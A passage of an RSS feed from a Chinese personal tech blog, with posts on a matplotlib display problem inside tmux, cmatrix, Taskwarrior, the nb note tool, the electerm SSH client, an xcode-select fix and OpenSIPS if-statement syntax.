      <pubDate>Wed, 31 Mar 2021 21:04:53 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/03/pqreg4/</guid>
      <description>&lt;p&gt;学习matplotlib绘图时，代码如下，执行过后，图片弹窗没有弹出。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;import matplotlib.pyplot as plt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;import matplotlib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;plt.plot&lt;span style=&#34;color:#f92672&#34;&gt;([&lt;/span&gt;1.6, 2.7&lt;span style=&#34;color:#f92672&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;plt.show&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;并且有下面的报错&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;cannot load backend &amp;lsquo;qt5agg&amp;rsquo; which requires the &amp;lsquo;qt5&amp;rsquo; interactive framework, as &amp;lsquo;headless&amp;rsquo; is currently running&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;看起来似乎是backend没有设置有关。查了些资料，设置了还是不行。&lt;/p&gt;
&lt;p&gt;最后偶然发现，我执行python 都是在tmux里面执行的，如果不再tmux会话里面执行，图片就能正常显示。&lt;/p&gt;
&lt;p&gt;问题从设置backend, 切换到tmux的会话。&lt;/p&gt;
&lt;p&gt;查到sf上正好有相关的问题，可能是在tmux里面PATH环境变量引起的问题。&lt;/p&gt;
&lt;p&gt;问题给的建议是把下面的代码写入.bashrc中，&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you&amp;rsquo;re on a Mac and have been wondering why &lt;code&gt;/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin&lt;/code&gt; keeps getting prepended to PATH when you run tmux, it&amp;rsquo;s because of a utility called path_helper that&amp;rsquo;s run from your &lt;code&gt;/etc/profile&lt;/code&gt; file.&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;You can&amp;rsquo;t easily persuade tmux (or rather, bash) not to source &lt;code&gt;/etc/profile&lt;/code&gt; (for some reason tmux always runs as a login shell, which means /etc/profile will be read), but you can make sure that the effects of path_helper don&amp;rsquo;t screw with your PATH.&lt;/p&gt;</description>
    </item>
    <item>
      <title>#shazam算法分析</title>
      <link>https://wdd.js.org/posts/2021/03/phgwbe/</link>
      <pubDate>Wed, 31 Mar 2021 09:12:46 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/03/phgwbe/</guid>
      <description>&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://coding-geek.com/how-shazam-works/&#34;&gt;http://coding-geek.com/how-shazam-works/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/yutianzuijin/article/details/49787551&#34;&gt;https://blog.csdn.net/yutianzuijin/article/details/49787551&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://hpac.cs.umu.se/teaching/sem-mus-17/Reports/Froitzheim.pdf&#34;&gt;http://hpac.cs.umu.se/teaching/sem-mus-17/Reports/Froitzheim.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/sfluor/musig&#34;&gt;https://github.com/sfluor/musig&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>黑客帝国终端字符瀑布</title>
      <link>https://wdd.js.org/posts/2021/03/fgutiw/</link>
      <pubDate>Thu, 25 Mar 2021 18:48:14 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/03/fgutiw/</guid>
      <description>&lt;h1 id=&#34;安装&#34;&gt;安装&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt install cmatrix
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;帮助文档&#34;&gt;帮助文档&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  ~ cmatrix --help
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Usage: cmatrix -&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;abBcfhlsmVx&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-u delay&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-C color&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -a: Asynchronous scroll
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -b: Bold characters on
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -B: All bold characters &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;overrides -b&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -c: Use Japanese characters as seen in the original matrix. Requires appropriate fonts
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -f: Force the linux $TERM type to be on
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -l: Linux mode &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uses matrix console font&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -L: Lock mode &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;can be closed from another terminal&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -o: Use old-style scrolling
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -h: Print usage and exit
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -n: No bold characters &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;overrides -b and -B, default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -s: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Screensaver&amp;#34;&lt;/span&gt; mode, exits on first keystroke
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -x: X window mode, use &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; your xterm is using mtx.pcf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -V: Print version information and exit
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -u delay &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; - 10, default 4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Screen update delay
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -C &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;color&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: Use this color &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; matrix &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default green&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -r: rainbow mode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -m: lambda mode
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>命令行笔记本 nb 记笔记何须离开终端？</title>
      <link>https://wdd.js.org/posts/2021/03/dtas0p/</link>
      <pubDate>Thu, 25 Mar 2021 18:18:41 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/03/dtas0p/</guid>
      <description>&lt;p&gt;nb是一个基于命令行的笔记本工具，功能很强大。&lt;/p&gt;
&lt;p&gt;记笔记何须离开终端？&lt;/p&gt;
&lt;h1 id=&#34;特点&#34;&gt;特点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;plain-text data storage,&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://xwmx.github.io/nb/#password-protected-encrypted-notes-and-bookmarks&#34;&gt;encryption&lt;/a&gt;,&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://xwmx.github.io/nb/#listing-notes&#34;&gt;filtering&lt;/a&gt; and &lt;a href=&#34;https://xwmx.github.io/nb/#-search&#34;&gt;search&lt;/a&gt;,&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://git-scm.com/&#34;&gt;Git&lt;/a&gt;-backed &lt;a href=&#34;https://xwmx.github.io/nb/#-revision-history&#34;&gt;versioning&lt;/a&gt; and &lt;a href=&#34;https://xwmx.github.io/nb/#-git-sync&#34;&gt;syncing&lt;/a&gt;,&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://pandoc.org/&#34;&gt;Pandoc&lt;/a&gt;-backed &lt;a href=&#34;https://xwmx.github.io/nb/#%EF%B8%8F-import--export&#34;&gt;conversion&lt;/a&gt;,&lt;/li&gt;
&lt;li&gt;global and local &lt;a href=&#34;https://xwmx.github.io/nb/#-notebooks&#34;&gt;notebooks&lt;/a&gt;,&lt;/li&gt;
&lt;li&gt;customizable &lt;a href=&#34;https://xwmx.github.io/nb/#-color-themes&#34;&gt;color themes&lt;/a&gt;,&lt;/li&gt;
&lt;li&gt;extensibility through &lt;a href=&#34;https://xwmx.github.io/nb/#-plugins&#34;&gt;plugins&lt;/a&gt;,&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;支持各种编辑器打开笔记， 我自然用VIM了。&lt;/p&gt;
&lt;p&gt;A text editor with command line support, such as:&lt;!-- raw HTML omitted --&gt;Vim,&lt;!-- raw HTML omitted --&gt;Emacs,&lt;!-- raw HTML omitted --&gt;Visual Studio Code,&lt;!-- raw HTML omitted --&gt;Sublime Text,&lt;!-- raw HTML omitted --&gt;micro,&lt;!-- raw HTML omitted --&gt;nano,&lt;!-- raw HTML omitted --&gt;Atom,&lt;!-- raw HTML omitted --&gt;TextMate,&lt;!-- raw HTML omitted --&gt;MacDown,&lt;!-- raw HTML omitted --&gt;some of these,&lt;!-- raw HTML omitted --&gt;and many of these.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Taskwarrior 命令行下的专业TodoList神器</title>
      <link>https://wdd.js.org/posts/2021/03/yyz3ca/</link>
      <pubDate>Thu, 25 Mar 2021 09:09:01 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/03/yyz3ca/</guid>
      <description>&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
&lt;p&gt;Taskwarrior是命令行下的todolist, 特点是快速高效且功能强大，&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持项目组&lt;/li&gt;
&lt;li&gt;支持燃烧图&lt;/li&gt;
&lt;li&gt;支持各种类似SQL的语法过滤&lt;/li&gt;
&lt;li&gt;支持各种统计报表&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;安装&#34;&gt;安装&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;get&lt;/span&gt; install taskwarrior
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;使用说明&#34;&gt;使用说明&lt;/h1&gt;
&lt;h2 id=&#34;增加todo&#34;&gt;增加Todo&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;task &lt;span style=&#34;color:#66d9ef&#34;&gt;add&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;分机注册测试&lt;/span&gt; due:today
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Created task &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;显示todolist&#34;&gt;显示TodoList&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  ~ task list
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ID Age Due        Description      Urg 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 5s  2021-03-25 分机注册测试     8.98
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;开始一个任务&#34;&gt;开始一个任务&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  ~ task &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; start
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting task &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;分机注册测试&amp;#39;&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Started &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; task.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  ~ task ls
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ID A Due Description     
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; *  9h 分机注册测试    
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;标记完成一个任务&#34;&gt;标记完成一个任务&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  ~ task &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Completed task &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;分机注册测试&amp;#39;&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Completed &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; task.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 任务完成后 task ls将不会显示已经完成的任务&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  ~ task ls
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;No matches.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 可以使用task all 查看所有的todolist&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  ~ task all 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ID St UUID     A Age  Done Project Due        Description                       
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; - C  341a0f48   2min 55s          2021-03-25 分机注册测试
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;燃烧图&#34;&gt;燃烧图&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 按天的燃烧图&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;task burndown.daily
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 按月的燃烧图&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;task burndown.monthly
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 按周的燃烧图&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;task burndown.weekly
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;日历&#34;&gt;日历&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;task calendar
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;更多介绍&#34;&gt;更多介绍&lt;/h1&gt;
&lt;p&gt;更多好玩的东西，可以去看看官方的使用说明文档 &lt;a href=&#34;https://taskwarrior.org/docs/&#34;&gt;https://taskwarrior.org/docs/&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>electerm 免费开源跨平台且功能强大的ssh工具</title>
      <link>https://wdd.js.org/posts/2021/03/tigv1h/</link>
      <pubDate>Wed, 24 Mar 2021 19:30:48 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/03/tigv1h/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://electerm.github.io/electerm/&#34;&gt;https://electerm.github.io/electerm/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;功能特点&#34;&gt;功能特点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Work as a terminal/file manager or ssh/sftp client(similar to xshell)&lt;/li&gt;
&lt;li&gt;Global hotkey to toggle window visibility (simliar to guake, default is &lt;code&gt;ctrl + 2&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Multi platform(linux, mac, win)&lt;/li&gt;
&lt;li&gt;🇺🇸 🇨🇳 🇧🇷 🇷🇺 🇪🇸 🇫🇷 🇹🇷 🇭🇰 🇯🇵 Support multi-language(&lt;a href=&#34;https://github.com/electerm/electerm-locales&#34;&gt;electerm-locales&lt;/a&gt;, contribute/fix welcome)&lt;/li&gt;
&lt;li&gt;Double click to directly edit remote file(small ones).&lt;/li&gt;
&lt;li&gt;Edit local file with built-in editor(small ones).&lt;/li&gt;
&lt;li&gt;Auth with publickey + password.&lt;/li&gt;
&lt;li&gt;Zmodem(rz, sz).&lt;/li&gt;
&lt;li&gt;Transparent window(Mac, win).&lt;/li&gt;
&lt;li&gt;Terminal background image.&lt;/li&gt;
&lt;li&gt;Global/session proxy.&lt;/li&gt;
&lt;li&gt;Quick commands&lt;/li&gt;
&lt;li&gt;Sync bookmarks/themes/quick commands to github/gitee secret gist&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Serial Port support&lt;/del&gt;(removed after version 1.10.14)&lt;/li&gt;
&lt;li&gt;Quick input to one or all terminal&lt;/li&gt;
&lt;li&gt;Command line usage: check &lt;a href=&#34;https://github.com/electerm/electerm/wiki/Command-line-usage&#34;&gt;wiki&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>mac升级后命令行报错 xcrun: error: invalid active developer path</title>
      <link>https://wdd.js.org/posts/2021/03/ibv4tb/</link>
      <pubDate>Wed, 24 Mar 2021 13:55:51 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/03/ibv4tb/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;xcode&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;--install
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/50b6771eb853&#34;&gt;https://www.jianshu.com/p/50b6771eb853&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>常用语句</title>
      <link>https://wdd.js.org/opensips/ch5/statement/</link>
      <pubDate>Tue, 23 Mar 2021 15:05:06 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/statement/</guid>
      <description>&lt;h1 id=&#34;if&#34;&gt;if&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;expr&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	actions
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	actions;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;expr&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	actions
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;expr&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	actions;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;表达式操作符号&#34;&gt;表达式操作符号&lt;/h1&gt;
&lt;p&gt;常用的用黄色标记。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;==&lt;/strong&gt; 等于&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;!=&lt;/strong&gt; 不等于&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;=~&lt;/strong&gt;  正则匹配 &lt;code&gt;$rU =~ &#39;^1800*&#39;&lt;/code&gt;  is &amp;ldquo;$rU begins with 1800&amp;rdquo;&lt;/li&gt;
